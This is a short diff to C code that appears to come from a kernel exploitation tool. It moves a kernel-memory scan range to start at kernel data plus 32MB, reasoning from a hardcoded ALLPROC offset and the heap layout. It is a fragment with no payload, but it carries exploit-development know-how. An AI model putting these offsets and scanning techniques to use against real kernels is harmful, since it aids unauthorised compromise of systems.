@@ -1409,11 +1409,15 @@ static void campaign_kmod_kldload(void) {
         struct { uint64_t start, end; const char *label; } ranges[4];
         int nranges = 0;
 
-        /* Range 1: above kernel data */
+        /* Range 1: kernel heap (right after kernel BSS → +1GB)
+         * ALLPROC is at kdata+0x27EDCB8 (~40MB), so BSS extends
+         * at least that far.  virtual_avail (heap start) is after BSS.
+         * Start at kdata+32MB to cover the transition zone.
+         * The hierarchical scan skips unmapped chunks instantly. */
         {
-            uint64_t s = g_kdata_base + 0x8000000;
+            uint64_t s = g_kdata_base + 0x2000000;  /* +32MB */
             uint64_t e = s + 0x40000000ULL; /* +1GB cap */
-            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "above kdata"}; }
+            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "kdata+32MB"}; }
         }
         /* Range 2: DMAP end → kernel text */
         {
